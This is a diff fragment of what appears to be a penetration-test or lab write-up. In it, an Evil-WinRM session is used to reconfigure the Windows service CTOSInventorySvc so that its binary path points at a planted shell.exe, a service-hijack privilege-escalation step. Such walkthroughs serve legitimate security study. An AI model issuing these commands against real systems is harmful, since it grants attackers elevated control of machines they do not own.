@@ -959,7 +959,7 @@ Mode                 LastWriteTime         Length Name
 -a----          9/2/2026  12:46 AM              0 shell.exe
 
 
-*Evil-WinRM* PS C:\Program Files\CTOS\InventoryService> sc.exe config CTOSInventorySvc binPath= "C:\Program Files\CTOS\InventoryService"
+*Evil-WinRM* PS C:\Program Files\CTOS\InventoryService> sc.exe config CTOSInventorySvc binPath= "C:\Program Files\CTOS\InventoryService\shell.exe"
 [SC] ChangeServiceConfig SUCCESS
 *Evil-WinRM* PS C:\Program Files\CTOS\InventoryService>
 ```
